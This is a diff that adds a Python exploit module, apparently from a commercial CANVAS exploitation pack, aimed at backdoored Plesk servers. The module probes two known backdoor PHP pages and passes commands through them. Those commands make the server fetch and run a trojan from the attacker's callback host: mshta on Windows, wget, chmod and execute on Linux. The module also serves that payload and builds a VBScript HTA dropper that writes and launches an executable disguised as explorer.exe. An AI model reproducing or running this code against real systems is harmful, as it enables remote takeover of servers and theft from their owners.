@@ -1,0 +1,300 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys, time, os, re, thread
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+from ExploitTypes.php_multi import *
+from exploitutils import *
+from libs.spkproxy import header, body
+
+from tcpexploit import tcpexploit
+import StringIO
+
+NAME = "d2sec_plesk_backdoor"
+VERSION = "0.1"
+DESCRIPTION = "Plesk Backdoor"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "8.x, 9.x, 10.0, 10.1, 10.2"
+DOCUMENTATION["Date public"] = "2012/03/15"
+DOCUMENTATION["References"] = """
+http://www.my-audit.gr/hacking/plesk-backdoors-a-very-large-number-of-servers-compromised/
+http://kb.parallels.com/en/112303
+"""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = ""
+
+targets = {
+  0: "Windows",
+  1: "Linux",
+}
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.host = ""
+    self.port = 80 
+    self.https = 0
+    self.uri = ''
+    self.cmd = ''
+    self.trojanname = "index.hta"
+    self.version = 0
+	
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.https = int(self.argsDict.get("https",self.https))
+    self.uri = self.argsDict.get("uri",self.uri)
+    self.cmd = self.argsDict.get("cmd",self.cmd)
+
+  def file4hta(self, exename):
+    evilprog = "explorer.exe"
+    e = []
+    for a in exename:
+      for b in a:
+        if b == "\r":
+          d = "0d"
+        elif b == "\n":
+          d = "0a"
+        elif b == "\0":
+          d = "00"
+        else:
+          c = hex(ord(b))
+          d = c.replace("0x", "")
+        if len(d) == 1:
+          d = "0"+d
+        e.append(d)
+    i = 0
+    j = 0
+    l = len(e)
+    hta = "<SCRIPT language=vbs>\n\n"
+    while 1:
+      hta += " prog = prog & \""
+      while i != 24:
+        hta += "%s," % e[j]
+        if j == l-1:
+          break
+        i += 1
+        j += 1
+      if j == l-1:
+        hta = hta[:-1] + "\"\n\n"
+        break
+      hta += "\"\n"
+      i = 0
+    hta += " tmp = Split(prog, \",\")\n"
+    hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+    hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+    hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+    hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+    hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+    hta += " For i = 0 To UBound(tmp)\n"
+    hta += "   prog = Int(\"&H\" & tmp(i))\n"
+    hta += "   f.Write Chr(prog)\n"
+    hta += " Next\n\n"
+    hta += " f.Close\n"
+    hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+    hta += " self.Close\n"
+    hta += "</SCRIPT>\n"
+    return hta
+
+  def neededListenerTypes(self):
+    import canvasengine
+    return [canvasengine.UNIVERSAL_MOSDEF]
+
+  def maketrojan(self):
+    from libs.canvasos import canvasos
+    my_os = canvasos(targets[self.version])
+    my_os.arch = 'X86' 
+    self.log("Creating a callback to %s:%s"%(self.callback.ip, self.callback.port))
+    if not self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True):
+      return 0 
+    if self.version == 0:
+      self.htafile = self.file4hta(self.mosdeftrojan)
+      file(self.trojanname, "wb").write(self.htafile)
+      self.setInfo("%s - done"%(NAME))
+    else:
+      file(self.trojanname, "wb").write(self.mosdeftrojan)
+    ret = len(self.mosdeftrojan) != 0
+    return ret
+
+  def makesploit(self, clientheader, clientbody):
+    h = header('SERVER')
+    b = body()
+    self.maketrojan()
+    if clientheader.URL.count(self.trojanname):
+      self.log("[D2] Sending MOSDEF trojan")
+      f = open(self.trojanname, "rb")
+      sploitstring = f.read()
+      f.close()
+      os.remove(self.trojanname)
+      self.log("[D2] Sending %d bytes"%len(sploitstring))
+      h.addHeader("Content-type","binary/octet-stream")
+      h.addHeader("Connection","close")
+      b.setBody(sploitstring)
+    return h, b
+
+  def listen(self):
+    s=self.gettcplistener(80, "0.0.0.0")
+    if not s:
+      self.log("[D2] Cannot listen on port 80 - perhaps that port is already bound?")
+      return 0
+    s.set_timeout(5)
+    self.s=s
+    return s
+
+  def accept(self, s=None ):
+    if s==None:
+      s=self.s
+    try:
+      infd,addr=s.accept()
+    except timeoutsocket.Timeout:
+      return
+    if infd==-1:
+      return
+    self.handle(infd)
+    return True
+
+  def handle(self, infd):
+    self.log("[D2] Handling connection")
+    clientheader = header(state = "SERVER")
+    clientheader.ssl = self.ssl
+    ret = clientheader.readdata(infd)
+    clientbody = body()
+    if clientheader.gotGoodHeader():
+      if clientheader.bodySize()>0 or clientheader.wasChunked:
+        self.log("[D2] Reading body")
+        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+        self.log("[D2] Read body")
+    self.log("[D2] Creating exploit response")
+    servheader,servbody = self.makesploit(clientheader,clientbody)
+    self.log("[D2] Responding")
+    bodydata="".join(servbody.data)
+    response = ""
+    response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+    self.log(response)
+    for akey in servheader.headerValuesDict.keys():
+      if akey not in [ "Content-Length", "Content-length"]:
+        response += servheader.grabHeader(akey)
+    self.log("[D2] Sending header data of %d bytes"%len(response))
+    chunked=0
+    if not chunked:
+      response+="Content-Length: "+str(len(bodydata))+"\r\n"
+    response+="\r\n"
+    response+="".join(bodydata)
+    self.log("[D2] Total response length is %d bytes"%len(response))
+    try:
+      infd.sendall(response)
+    except socket.error:
+      self.log("[D2] Connection closed by peer")
+    self.log("[D2] Response sent")
+    infd.close()
+    return
+
+  def startHTTPServer(self):
+    s=self.listen()
+    if not s:
+      self.log("[D2] Failed to listen - not running")
+      return 0
+    while 1:
+      if self.state==self.HALT:
+        self.s.close()
+        break
+      self.accept()
+    self.setInfo("[D2] %s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+    return 1
+
+  def run_backdoor(self, backdoor):
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return 0
+    data = status = ''
+    content = StringIO.StringIO()
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, backdoor)
+      c.setopt(c.WRITEFUNCTION, content.write)
+      c.setopt(c.TIMEOUT, 15)
+      if self.https:
+        c.setopt(c.SSL_VERIFYPEER, 0)
+        c.setopt(c.SSL_VERIFYHOST, 0)
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.perform()
+      status = c.getinfo(pycurl.HTTP_CODE) 
+      data = content.getvalue()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return ''
+    return (status, data)
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
+    backdoor = [
+      'enterprise/control/ctrl.php3?x',
+      'enterprise/control/psa/engine.php?z'
+    ]
+    proto = 'http'
+    if self.cmd:
+      command = [self.cmd]
+    else:
+      if self.version == 0:
+        command = ["mshta.exe http://" + self.callback.ip + "/" + self.trojanname]
+      else:
+        command = ["wget -O /tmp/" + self.trojanname + " http://" + self.callback.ip + "/" + self.trojanname, "chmod +x /tmp/" + self.trojanname, "/tmp/" + self.trojanname]
+      thread.start_new_thread(self.startHTTPServer,())
+    for sc in backdoor:
+      self.log('[D2] Check backdoor %s' % sc)
+      if self.https: proto = 'https'
+      (status, data) = self.run_backdoor('%s://%s/%s/%s' % (proto, self.host, self.uri, sc)) 
+      if status != 200:
+        self.log('[D2] page not found')
+        continue
+      self.log('[D2] backdoor found')
+      for cmd in command:
+        cmd = cmd.replace(' ', '%20')
+        cmd = cmd.replace('+', '%2b')
+        (status, data) = self.run_backdoor('%s://%s/%s/%s=%s' % (proto, self.host, self.uri, sc, cmd))
+        if self.cmd:
+          self.log('[D2] %s' % data)
+      if not self.cmd:
+        while 1:
+          time.sleep(1)
+        break
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: %s -v version -t targethost -l localip -d localport [-O uri:uri -O cmd:command]\n" % sys.argv[0]
+    i = 0
+    print 'Available versions:'
+    for listline in targets.values():
+      print '\t%d: %s'%(i, listline)
+      i = i + 1
+    sys.exit(0)
+
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
